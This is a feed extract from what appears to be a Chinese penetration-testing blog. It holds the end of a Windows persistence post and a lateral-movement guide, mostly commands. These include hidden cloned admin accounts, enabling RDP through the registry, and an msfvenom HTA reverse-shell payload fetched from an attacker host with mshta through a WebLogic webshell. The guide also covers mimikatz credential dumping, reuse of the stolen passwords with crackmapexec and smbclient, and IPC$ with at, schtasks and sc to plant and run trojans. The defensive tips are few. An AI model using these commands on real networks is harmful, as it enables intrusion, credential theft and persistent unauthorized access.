class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net user admin$</span><br></pre></td></tr></table></figure><p>无法通过<code>net user admin$ /del</code>删除该用户，提示用户不属于此组，如下图</p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208261544986.png" alt="Alt text"></p><h2 id="删除方法："><a href="#删除方法：" class="headerlink" title="删除方法："></a><strong>删除方法：</strong></h2><p>删除注册表<code>HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\</code>下对应帐户的键值(共有两处)</p><p><strong>注：</strong>工具HideAdmin能自动实现以上的创建和删除操</p><h2 id="防御方法："><a href="#防御方法：" class="headerlink" title="防御方法："></a>防御方法：</h2><ul><li>针对隐藏帐户的利用，查看注册表<code>HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\</code>即可</li></ul><blockquote><p> 当然，默认管理员权限无法查看，需要**&#x3D;&#x3D;分配权限或是提升至Sytem权限&#x3D;&#x3D;**</p></blockquote><ul><li>隐藏帐户的登录记录，可通过查看日志获取</li></ul><h2 id="注意事项："><a href="#注意事项：" class="headerlink" title="注意事项："></a>注意事项：</h2><h3 id="复制管理员帐户Administrator"><a href="#复制管理员帐户Administrator" class="headerlink" title="复制管理员帐户Administrator"></a>复制管理员帐户Administrator</h3><p>需要注意管理员帐户是否被禁用，如果被禁用，那么克隆出的隐藏帐户也是被禁用状态</p><h3 id="复制已有帐户"><a href="#复制已有帐户" class="headerlink" title="复制已有帐户"></a>复制已有帐户</h3><p>在3389远程登录的利用上存在相同帐户的冲突关系。通过cmd开启本机的3389远程登录功能：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">REG ADD &quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</span><br><span class="line">REG ADD &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; /v PortNumber /t REG_DWORD /d 0x00000d3d /f</span><br></pre></td></tr></table></figure><p>利用以上方法，克隆帐户a的权限，建立隐藏帐户aaa$。如果系统当前登录帐号为a，那么使用隐藏帐户aaa$登录的话，会系统被识别为帐户a，导致帐户a下线</p><h3 id="新建帐户再复制"><a href="#新建帐户再复制" class="headerlink" title="新建帐户再复制"></a>新建帐户再复制</h3><p>进一步，大胆的思考。新建管理员帐户b，克隆帐户b，建立隐藏账户bbb$。删除管理员帐户b，隐藏账户bbb$仍然有效</p><h3 id="原帐户的维持"><a href="#原帐户的维持" class="headerlink" title="原帐户的维持"></a>原帐户的维持</h3><p>再进一步。克隆帐户a的权限，建立隐藏帐户aaa$。修改帐户a的密码，隐藏帐户aaa$仍然有效</p><h1 id="启动项-文件夹启动"><a href="#启动项-文件夹启动" class="headerlink" title="启动项-文件夹启动"></a>启动项-文件夹启动</h1><blockquote><p>很容易被发现</p></blockquote><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>在每次开机或重启的时候就会运行启动文件夹下的程序（把快捷方式丢进来就好啦），和前面开机自启注册表项很类似。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#用户启动项目录路径位置</span><br><span class="line">C:\Users\&#123;UserName&#125;\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup</span><br><span class="line">#系统启动目录</span><br><span class="line">C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup</span><br></pre></td></tr></table></figure><h2 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h2><ul><li><p>登录服务器，单击【开始】&gt;【所有程序】&gt;【启动】，默认情况下此目录在是一个空目录，确认是否有非业务程序在该目录下。</p></li><li><p>单击开始菜单 &gt;【运行】，输入 msconfig，查看是否存在命名异常的启动项目，是则取消勾选命名异常的启动项目，并到命令中显示的路径删除文件。</p></li><li><p>单击【开始】&gt;【运行】，输入 regedit，打开注册表，查看开机启动项是否正常，特别注意如下三个注册表项：</p></li></ul><blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HKEY_CURRENT_USER\software\micorsoft\windows\currentversion\run HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Runonce </span><br></pre></td></tr></table></figure><p>检查右侧是否有启动异常的项目，如有请删除，并建议安装杀毒软件进行病毒查杀，清除残留病毒或木马。</p></blockquote><ul><li>利用安全软件查看启动项、开机时间管理等。</li><li>组策略，运行gpedit.msc。</li></ul><blockquote><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208261631491.png" alt="image-20220826163144164" style="zoom: 33%;" /></blockquote><ul><li>wmic startup list 检查启动项</li></ul><h1 id="服务后门"><a href="#服务后门" class="headerlink" title="服务后门"></a>服务后门</h1><blockquote><p>用sc创建一个test服务，执行我们上传的木马。实用性不是很强</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sc create test binPath= BinaryPathName</span><br></pre></td></tr></table></figure><p>重启权限维持，但一般杀软会拦截。</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><blockquote><p><a href="https://bypass007.github.io/Emergency-Response-Notes/privilege/%E7%AC%AC2%E7%AF%87%EF%BC%9AWindows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81--%E5%90%8E%E9%97%A8%E7%AF%87.html">Windows权限维持–后门篇</a></p><p><a href="https://cloud.tencent.com/developer/article/1850726">干货 | 最全Windows权限维持总结</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 内网 </category>
          
          <category> 权限维持 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 权限维持 </tag>
            
            <tag> 后门 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>0x28 - 内网横向移动</title>
      <link href="/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%86%85%E7%BD%91/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/0x28-%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8.html"/>
      <url>/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%86%85%E7%BD%91/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/0x28-%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="横向移动简介"><a href="#横向移动简介" class="headerlink" title="横向移动简介"></a>横向移动简介</h1><p>当攻击者在拿下一台内网主机后，通常会利用当前拿下的机器当作跳板，进一步攻击内网其他主机，扩大攻击影响范围。</p><p>工作组内横向移动和在外网渗透很相似</p><p>域内横向移动的话就需要寻找到域内的相应用户、域控， 最直接的拿到权限方法就是获取哈希或者用户凭证，最直接拿到域控权限的方法，再就是得到了域内一个主机的账户密码就可以尝试对域内其他的主机账户尝试登录。只要在你的机器上登录过域控，就有可能从你的机器中拿到域控的凭证登录域控。再或者就是内网弱口令也很多，这种弱口令一拿就是一大批，扩大攻击范围。</p><p>我们内网渗透过程中，首先使用Windows内置的工具，如果不满足需求就再上传外部工具进行渗透</p><h1 id="获得权限"><a href="#获得权限" class="headerlink" title="获得权限"></a>获得权限</h1><p>也就是拿到一台进入内网的入口,信息收集发现weblogic资产</p><ul><li>扫描：</li></ul><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208112055209.png" alt="image-20220811205540863" style="zoom: 33%;" /><ul><li>利用weblogic历史漏洞：利用脚本写入webshell</li></ul><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208112057659.png" alt="image-20220811205716568" style="zoom:50%;" /><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208112058391.png" alt="image-20220811205828304" style="zoom:50%;" /><ul><li>利用小马传大马：MSF生成HTA反弹shell</li></ul><p>传hta弹shell，可以远程下载hta，无文件落地上线msf（优点）</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.58.133 lport=4002 -f hta-psh -o 4002.hta</span><br><span class="line"></span><br><span class="line">-f hta-psh以hta格式输出</span><br><span class="line"></span><br><span class="line">并开启msf监听：</span><br></pre></td></tr></table></figure><ul><li>通过WEB漏洞反弹shell</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">（内置）mshta远程下载hta文件执行</span><br><span class="line">并在vps开启一个web服务供下载hta文件（python3 -m http.server）</span><br><span class="line">http://1xx.xx.xx.95:7001/bea_wls_internal/demo.jsp?pwd=admin&amp;cmd=cmd /c mshta http://1xx.xx.xx.91:8000/6666.hta</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">cmd /c mshta http://1xx.xx.xx.91:8000/6666.hta</span><br><span class="line">以非交互式方式执行命令</span><br></pre></td></tr></table></figure><ul><li><p>得到MSF会话，在meterpreter中，可以通过run命令记载Post\后渗透模块进行使用。</p></li><li><p>获取账号密码</p></li></ul><p><strong>mimikatz能从lsass.exe文件中读取密码，因为只要某个用户登录过，其密码就会记录在lsass.exe进程中，只要其没有重启或者关机，密码都会记录在lsass.exe进程之中</strong></p><p><strong>这种记录密码的特性为我们域内渗透提供了一种新的思路：</strong></p><p><strong>如果域提权不了，拿不到域控，我们便可以通过下面获取账号密码的方式可以获取其他用户的账户和密码</strong></p><p><strong>那么我们就可以从获取的其他用户账户密码入手继续登录其他主机，再在其机器上查找有无域控账户的登录痕迹，如果域控登陆过这台机器，就会有域控的账户密码，籍此方法间接获取域控的权限</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hashdump</span><br></pre></td></tr></table></figure><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208051846777.png" alt="image-20220805184648622" style="zoom:50%;" /><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">在msf中有集成mimikatz的模块</span><br><span class="line">load kiwi加载内置的mimikatz</span><br><span class="line">加载完模块后，可以通过help查看加载的模块的用法</span><br><span class="line">getsystem先提升权限，获取system权限</span><br><span class="line">creds_all获取所有凭证</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">web\administrator   1qaz@WSX</span><br></pre></td></tr></table></figure><ul><li>登录验证（验证拿到的账号密码能否进行登录）</li></ul><p>通过了两个工具，一个是crackmapexec，一个是smbclient</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">crackmapexec：对目标主机smb协议以及默认文件共享进行一枚举，通过我们提供的账户密码获取其文件共享</span><br><span class="line">crackmapexec smb 192.168.10.112 -u &#x27;WEB\administrator&#x27; -p &#x27;1qaz@WSX&#x27; --shares</span><br><span class="line">用GUNGNIR域控管理员的账户密码：</span><br><span class="line">crackmapexec smb 192.168.10.112 -u &#x27;administrator&#x27; -p &#x27;1qaz@WSX3&#x27; --shares</span><br><span class="line"></span><br><span class="line">smbclient：利用账户密码，提供smb服务登录到其系统，就相当于拿到了一个命令行终端</span><br><span class="line">smbclient //192.168.10.112/C$ -U &#x27;WEB\administrator%1qaz@WSX&#x27;</span><br><span class="line">输入help即可查看可以使用的命令</span><br></pre></td></tr></table></figure><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208120911337.png" alt="image-20220812091111949"></p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208051847741.png" alt="image-20220805184747362" style="zoom:50%;" /><h2 id="补充知识："><a href="#补充知识：" class="headerlink" title="补充知识："></a>补充知识：</h2><blockquote><ul><li>cs中meterpreter中的shell的本质，就是在目标主机起一个cmd.exe</li><li>H:\ATTACK\权限提升\SysinternalsSuite目录中有Sysinternal工具</li></ul><p>Sysinternal是微软官方开发的一些工具套件，可以使用这些工具去分析系统的一些进程啊什么的</p><p>可以使用文件夹中的procexp64.exe来分析进程</p></blockquote><ul><li>内网主机存活探测(尝试找出域控ip)</li></ul><p>如何寻找域控呢？</p><ol><li>下面工具的功能，类似内网<code>arp -a</code>查看各个网段有哪些IP主机存活,并尝试判断域控是哪个</li></ol><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208121520690.png" alt="image-20220812152048429" style="zoom: 50%;" /><ol start="2"><li><code>ipconfig -all</code>查找本机的DNS服务器，一般是域控在提供DNS解析</li></ol><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208130005835.png" alt="image-20220813000513503" style="zoom:50%;" /><p>3.直接ping 域名，如<code>ping gungnir.top</code></p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208130006771.png" alt="image-20220813000617610" style="zoom:50%;" /><ol start="4"><li>扫描发现：</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nbscan.exe -m 10.10.10.0/24</span><br><span class="line">arp-scan.exe -t 10.10.10.0/24</span><br></pre></td></tr></table></figure><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208051848699.png" alt="image-20220805184808384" style="zoom: 33%;" /><h1 id="横向移动-内置工具篇"><a href="#横向移动-内置工具篇" class="headerlink" title="横向移动-内置工具篇"></a>横向移动-内置工具篇</h1><h2 id="IPC"><a href="#IPC" class="headerlink" title="IPC$"></a>IPC$</h2><h3 id="IPC-简介"><a href="#IPC-简介" class="headerlink" title="IPC$  简介"></a>IPC$  简介</h3><p>IPC$  (Internet Process Connection) 是<strong>共享”命名管道”<strong>的资源，它是为了</strong>让进程间通信而开放的命名管道</strong>，通过提供可信任的用户名和口令，连接双方可以建立安全的通道并以此通道进行加密数据的交换，从而实现对远程计算机的访问。当然也可以关闭<br>利用 IPC$ ，连接者与目标主机利用建立的连接可以得到目标主机上的<strong>目录结构、用户列表</strong>等信息。</p><h3 id="使用条件"><a href="#使用条件" class="headerlink" title="使用条件"></a>使用条件</h3><ul><li>开放了 139 、 445 端口；</li></ul><p>IPC$  连接可以实现<strong>远程登陆及对默认共享</strong>的访问，而 <strong>139 端口的开启表示 netbios</strong>  协议的应用。445是smb服务<br>我们可以通过 139 和 445 端口来实现对共享文件&#x2F;打印机的访问，因此一般来讲， IPC$ 连接是需要 139或 445 端口来支持的。<br>IPC$  连接默认会走 445 端口，不通的话则会走 139 端口，这两个端口都可以单独实现文件共享</p><p>一般Windows会有默认共享，也就是意味着会开发这些端口</p><ul><li>目标开启 IPC$  <strong>文件共享服务</strong>及<strong>默认共享</strong></li></ul><p>默认共享是<strong>为了方便管理员远程管理</strong>而默认开启的共享。<br>所有逻辑磁盘（ c$、d$、e$ …）和系统目录 WINNT  或 WINDOWS（ADMIN$） ，通过IPC连接可以实现对这些默认共享的访问。具备管理员权限即可去实现相应的功能</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208051850244.png" alt="image-20220805185059115" style="zoom:50%;" /><ul><li>需要目标机器的<strong>管理员账号和密码</strong></li></ul><p>域内：默认情况下只有被添加到远程计算机<strong>管理员组的域用户（域管用户）</strong>有权限对 <strong>admin$</strong>  目录建立 IPC  连接</p><p>工作组内：<strong>本地的 Administrator  用户</strong>也可以，但是默认情况下该用户是被禁用的，如果启用了该用户，那么也可以使用 Administrator  用户远程连接</p><h3 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h3><p>这些命令不要死记硬背，只要我们本地用什么命令，如何加上个<code>\\10.10.10.10\</code>即可</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. 连接</span><br><span class="line">net use \\10.10.10.10\ipc$ /user:PC\administrator &quot;1qaz@WSX3e&quot;</span><br><span class="line">net use \\10.10.10.10\ipc$ /user:GUNGNIR\administrator &quot;1qaz@WSX3&quot;</span><br><span class="line">2. 查看连接情况</span><br><span class="line">net use</span><br><span class="line">3. 查看目标主机时间</span><br><span class="line">net time \\10.10.10.10</span><br><span class="line">net  time 默认查看本机时间</span><br><span class="line">4. 查看C盘文件</span><br><span class="line">dir \\10.10.10.10\c$</span><br></pre></td></tr></table></figure><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208051854255.png" alt="image-20220805185438016" style="zoom: 50%;" /><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">4. 删除连接</span><br><span class="line">net use \\10.10.10.201\ipc$ /del </span><br><span class="line">net use * /del /y</span><br></pre></td></tr></table></figure><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208051855893.png" alt="image-20220805185501722" style="zoom:50%;" /><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">5. 文件上传下载</span><br><span class="line">copy shell.exe \\10.10.10.201\c$\windows\temp\plugin_update.exe   </span><br><span class="line">copy \\10.10.10.201 \c$\59.exe c:\</span><br><span class="line">6. 查看目标主机文件</span><br><span class="line">dir \\10.10.10.201\c$</span><br><span class="line">7. 开放/关闭 ipc$ 共享。</span><br><span class="line">net share ipc$</span><br><span class="line">net share ipc$ /del</span><br><span class="line">8. 共享计算机 C 盘。</span><br><span class="line">net share C=c:\</span><br><span class="line">9. 映射共享磁盘到本地。将目标的C盘挂载到本地的z盘下（原本没有z盘）</span><br><span class="line">net use z: \\10.10.10.10\c$ </span><br><span class="line">10. 查看/删除共享的资源。</span><br><span class="line">net share</span><br><span class="line">net share C /del</span><br><span class="line">11. 取消IPC远程连接。</span><br><span class="line">net use c: /del</span><br><span class="line">net use * /del /y</span><br></pre></td></tr></table></figure><p>挂在目标机器的磁盘效果图：</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208130022829.png" alt="image-20220813002211620" style="zoom:50%;" /><h3 id="IPC-连接失败常见错误号"><a href="#IPC-连接失败常见错误号" class="headerlink" title="IPC$连接失败常见错误号"></a>IPC$连接失败常见错误号</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">一定要注意防火墙问题！！！！大部分内网机器都可能开了防火墙</span><br><span class="line"></span><br><span class="line">错误号 5，拒绝访问                      【很可能你使用的用户不是管理员权限，先提升权限】</span><br><span class="line">错误号 51，Windows 无法找到网络路径     【网络有问题】</span><br><span class="line">错误号 53，找不到网络路径               【ip 地址错误；目标未开机；目标 lanmanserver 服务未启动；目标有防火墙（端口过滤）】</span><br><span class="line">错误号 67，找不到网络名                 【你的 lanmanworkstation 服务未启动；目标删除了 ipc$；】</span><br><span class="line">错误号 1219，提供的凭据与已存在的凭据集冲突     【你已经和对方建立了一个ipc$，请删除后再连】</span><br><span class="line">错误号 1326，未知的用户名或错误密码             【用户名或密码错误】</span><br><span class="line">错误号 1385，登录失败：未授予用户在此计算机上的请求登录类型</span><br><span class="line">错误号 1792，试图登录，但是网络登录服务没有启动     【目标NetLogon服务未启动[连接域控会出现此情况]】</span><br><span class="line">错误号 2242，此用户的密码已经过期                   【目标有帐号策略，强制定期要求更改密码】</span><br></pre></td></tr></table></figure><h2 id="IPC-AT-x2F-Schtasks"><a href="#IPC-AT-x2F-Schtasks" class="headerlink" title="IPC+AT&#x2F;Schtasks"></a>IPC+AT&#x2F;Schtasks</h2><ul><li>ipc 结合定时任务实现执行上传的文件 得到权限的过程 。主要是因为本地开启一个进程可以用<code>start a.exe</code> 但是通过net建立连接的远程主机是不支持start远程开启进程。所以我们才需要依赖定时任务</li><li>at&#x2F;schtasks都是定时任务，后面几个版本淘汰了at</li><li>打开计划任务的命令是<code>Taskschd.msc</code></li></ul><h3 id="AT简介"><a href="#AT简介" class="headerlink" title="AT简介"></a>AT简介</h3><p>AT命令可在指定时间和日期、在指定计算机上运行命令和程序。</p><blockquote><p><a href="https://docs.microsoft.com/zh-cn/troubleshoot/windows-client/system-management-components/use-at-command-to-schedule-tasks">https://docs.microsoft.com/zh-cn/troubleshoot/windows-client/system-management-components/use-at-command-to-schedule-tasks</a></p></blockquote><h4 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">建立IPC连接：</span><br><span class="line">net use \\10.10.10.30\c$ /user:pc\administrator &quot;1qaz@WSX&quot;</span><br><span class="line"></span><br><span class="line">上传木马文件59.exe：</span><br><span class="line">copy 59.exe \\10.10.10.30\c$</span><br><span class="line"></span><br><span class="line">查看远程主机时间：</span><br><span class="line">net time \\10.10.10.30</span><br><span class="line"></span><br><span class="line">AT命令添加任务：(注意执行可执行程序要带绝对路径，并且双斜杠)</span><br><span class="line">at \\10.10.10.30 19:08 c:\\59.exe</span><br><span class="line">at \\10.10.10.30 19:08 calc.exe这样执行不会有回显啊什么的 但是确切的会执行程序</span><br><span class="line"></span><br><span class="line">AT命令删除任务：</span><br><span class="line">at \\10.10.10.30 1 /delete</span><br><span class="line"></span><br><span class="line">AT命令查看任务：</span><br><span class="line">at \\10.10.10.30   #查看at任务列表，已经执行了的，不会显示。</span><br></pre></td></tr></table></figure><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208051859950.png" alt="image-20220805185712800"></p><p>注意：</p><blockquote><p>问题：执行at命令时，显示绑定句柄无效。<br>解决：echo 10.10.11.100 RemoteHost &gt; C:\Windows\System32\drivers\etc\hosts<br>AT命令在windows server 2012等新版系统中已被弃用<br>AT命令如果找不到网络路径，则判断是目标主机已禁用 Task Scheduler服务</p></blockquote><h3 id="Schtasks简介"><a href="#Schtasks简介" class="headerlink" title="Schtasks简介"></a>Schtasks简介</h3><p>由于 AT 在 windows server 2012 等新版系统中已被弃用，所以需要使用 schtasks  命令代替。</p><blockquote><p>允许管理员创建、删除、查询、更改、运行和中止本地或远程系统上的计划任务</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/Create     创建新计划任务。</span><br><span class="line">/Delete     删除计划任务。</span><br><span class="line">/Query      显示所有计划任务。</span><br><span class="line">/Change     更改计划任务属性。</span><br><span class="line">/Run        按需运行计划任务。</span><br><span class="line">/End        中止当前正在运行的计划任务。</span><br><span class="line">/ShowSid    显示与计划的任务名称相应的安全标识符。</span><br><span class="line">/?          显示此帮助消息。</span><br></pre></td></tr></table></figure><blockquote><p>更多请参考：<a href="https://blog.csdn.net/qq_39680564/article/details/88993633">https://blog.csdn.net/qq_39680564/article/details/88993633</a></p></blockquote><h4 id="命令格式"><a href="#命令格式" class="headerlink" title="命令格式"></a>命令格式</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#创建任务</span><br><span class="line">schtasks /create /tn task1 /U 域\域用户 /P 域用户密码 /tr 命令 /sc ONSTART /s 域机器ip /RU system</span><br><span class="line">#运行任务</span><br><span class="line">schtasks /run /tn task1 /s 192.168.10.2 /U 域/域用户 /P 域用户密码</span><br><span class="line">#删除任务</span><br><span class="line">schtasks /F /delete /tn task1 /s 域机器ip /U 域\域用户 /p 域用户密码</span><br><span class="line"></span><br><span class="line">#具体细项的意义：</span><br><span class="line">schtasks /create             创建新的计划任务。</span><br><span class="line">         /sc schedule        指定计划类型。有效值为 MINUTE、HOURLY、DAILY、WEEKLY、MONTHLY、ONCE、ONSTART、ONLOGON、ONIDLE。</span><br><span class="line">         /mo modifier        指定任务在其计划类型内的运行频率。这个参数对于 MONTHLY 计划是必需的。对于 MINUTE、HOURLY、DAILY 或 WEEKLY 计划，这个参数有效，但也可选。默认值为 1。</span><br><span class="line">         /tr &lt;TaskRun&gt;       指定任务运行的程序或命令。如果忽略该路径，SchTasks.exe 将假定文件在Systemroot\System32 目录下。</span><br><span class="line">         /tn &lt;TaskName&gt;      指定任务的名称。</span><br></pre></td></tr></table></figure><h4 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h4><ul><li>建立IPC连接</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net use \\10.10.10.201 /user:PC\administrator &quot;1qaz@WSX&quot;</span><br><span class="line">net use</span><br></pre></td></tr></table></figure><ul><li>上传木马</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dir \\10.10.10.201\c$</span><br><span class="line">copy c:\windows\temp\59.exe \\10.10.10.201\c$</span><br></pre></td></tr></table></figure><ul><li>远程主机创建定时任务</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">schtasks /create /s 10.10.10.30 /u PC\administrator /p &quot;1qaz@WSX3&quot; /sc MINUTE /mo 1 /tn test2 /tr &quot;c:\59.exe&quot;</span><br><span class="line"></span><br><span class="line">/sc minute 间隔类型：分钟，minute、month、day、hours</span><br><span class="line">/mo 1间隔时常：每1，配合/sc，表示每1分钟</span><br></pre></td></tr></table></figure><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208081304694.png" alt="image-20220808130447566" style="zoom:50%;" /><ul><li>查看远程主机创建的定时任务</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chcp 65001</span><br><span class="line">schtasks /query /s 10.10.10.201 /tn test2</span><br></pre></td></tr></table></figure><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208081305648.png" alt="image-20220808130550497" style="zoom:50%;" /><p>不更改代码页编码，直接查看可能会显示如下错误：</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208081306574.png" alt="image-20220808130607471" style="zoom:50%;" /><ul><li>立即执行Schtasks运行远程主机上的计划任务</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">schtasks /run /s 10.10.10.201 /u de1ay\administrator /p &quot;1qaz@WSX3&quot; /tn test2</span><br></pre></td></tr></table></figure><ul><li>Schtasks删除远程主机上的计划任务</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">schtasks /delete /tn At1 /s 10.10.10.201 /u administrator /p 1qaz@WSX3e</span><br></pre></td></tr></table></figure><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208081306353.png" alt="image-20220808130645254" style="zoom:50%;" /><h2 id="IPC-SC"><a href="#IPC-SC" class="headerlink" title="IPC+SC"></a>IPC+SC</h2><h3 id="SC简介"><a href="#SC简介" class="headerlink" title="SC简介"></a>SC简介</h3><p>sc 命令是Windows系统下通过<strong>注册、删除和查询系统服务</strong>的一个东西。</p><p>注意：</p><ul><li>关于Windows服务，其均是以system权限启动，所以我们如果通过注册建立了一个服务，通过服务开启的终端将也会具备system的权限！！另外需要管理员权限才能创建服务。也就是从管理员到系统权限的一个过程</li></ul><blockquote><p>sc命令详解：<a href="http://www.cnsendblog.com/?p=644">http://www.cnsendblog.com/?p=644</a></p><p>视频粗略讲解：<a href="https://www.bilibili.com/video/BV1t54y1e7Qj?spm_id_from=333.337.search-card.all.click&amp;vd_source=e73a152dada4626bad49c30d848902f7">https://www.bilibili.com/video/BV1t54y1e7Qj?spm_id_from=333.337.search-card.all.click&amp;vd_source=e73a152dada4626bad49c30d848902f7</a></p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">语法格式：</span><br><span class="line">SC [Servername] command Servicename [Optionname= Optionvalues]</span><br><span class="line"></span><br><span class="line">常见：</span><br><span class="line">sc \query 查看系统所有服务信息 ，询问一个服务的状态，也可以列举服务的状态类型。 有很多 一般会超出缓冲区限制，可以先复制到剪切板</span><br><span class="line">sc \query | clip查看全部内容</span><br><span class="line">sc \query +服务名   查看指定名称的信息</span><br><span class="line">sc 可以通过config设置服务的状态</span><br><span class="line">sc stop +服务名    停止服务</span><br><span class="line">sc config +服务名 start= 类型设置服务的启动类型（注意类型前有空格）</span><br><span class="line">sc qc --------------查询服务的配置信息</span><br></pre></td></tr></table></figure><p>注意：</p><ul><li>很多的命令需要管理员权限，所以我想说，在你操作这些东西的时候最好是管理员。</li><li>当你键入SC而不带任何参数时，SC.exe会显示帮助信息和可用的命令。当你键入SC紧跟着命令名称时，你可以得 到一个有关这个命令的详细列表。比如，键入sc create可以得到和create有关的列表。 但是除了一个命令，sc query，这会导出该系统中当前正在运行的所有服务和驱动程序的状态。 </li><li>当你使用start命令时，你可以传递一些参数（arguments）给服务的主函数，但是不是给服务进程的主函数。</li></ul><h3 id="SC远程注册服务"><a href="#SC远程注册服务" class="headerlink" title="SC远程注册服务"></a>SC远程注册服务</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#sc远程创建服务</span><br><span class="line">sc \\10.10.10.201 create test binpath= &quot;c:\59.exe&quot; obj= &quot;de1ay\administrator&quot; password= 1qaz@WSX3e</span><br><span class="line">#sc启动指定服务</span><br><span class="line">sc \\10.10.10.201 start test</span><br><span class="line">#sc停止指定服务</span><br><span class="line">sc \\10.10.10.201 stop test</span><br><span class="line">sc \\10.10.10.201 delete test</span><br></pre></td></tr></table></figure><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208081307487.png" alt="image-20220808130724362" style="zoom:50%;" /><p><strong>注意几点：</strong></p><ul><li><p>binpath设置选项’&#x3D;’后面有一个空格,这种选项等会后面都要接一个等号再接选项值</p></li><li><p>Windows上注册一个服务的话，必须要是服务类型，也就是创建时候binpath的文件要是服务，而不是进程。因为如果不是一个服务的话，就会导致生成的服务和服务控制器之间无法通信，服务控制器会判定这个服务不是一个系统的服务。因此就会产生隔一段时间就会断掉的现象。那么如何解决此类问题呢？</p><p>方法一：进程迁移，在连接终端期间执行其他命令。将我们的连接稳固到其他进程中</p><p>方法二：通过sc注册服务，生成的木马要是服务类型。可以在cs中生成。</p></li></ul><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208131628485.png" alt="image-20220813162825167" 